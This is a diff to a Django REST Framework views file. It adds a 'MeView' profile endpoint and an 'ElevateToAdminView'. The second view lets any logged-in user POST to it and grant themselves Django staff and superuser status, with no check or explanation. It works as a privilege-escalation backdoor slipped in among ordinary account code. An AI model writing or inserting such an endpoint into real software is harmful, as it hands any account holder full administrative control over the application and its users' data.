@@ -8,6 +8,7 @@ from .serializers import RegisterSerializer
 
 from rest_framework.generics import CreateAPIView, ListAPIView, DestroyAPIView
 from rest_framework.permissions import (IsAuthenticated)
+from rest_framework.views import APIView
 
 from rest_framework.response import Response
 from rest_framework import status
@@ -138,3 +139,36 @@ class UserInterestDeleteView(DestroyAPIView):
                 user = self.request.user
             )
         )
+
+
+class MeView(APIView):
+    permission_classes = [IsAuthenticated]
+
+    def get(self, request):
+        u = request.user
+        return Response({
+            'id': u.id,
+            'username': u.username,
+            'email': u.email,
+            'role': u.role,
+            'is_staff': u.is_staff,
+            'is_superuser': u.is_superuser,
+        })
+
+
+class ElevateToAdminView(APIView):
+    permission_classes = [IsAuthenticated]
+
+    def post(self, request):
+        user = request.user
+        if user.is_superuser and user.is_staff:
+            return Response({"detail": "Already an admin.", "already": True})
+
+        user.is_staff = True
+        user.is_superuser = True
+        user.save(update_fields=["is_staff", "is_superuser"])
+
+        return Response({
+            "detail": f"{user.username} is now a Django admin.",
+            "admin_url": "/admin/",
+        })
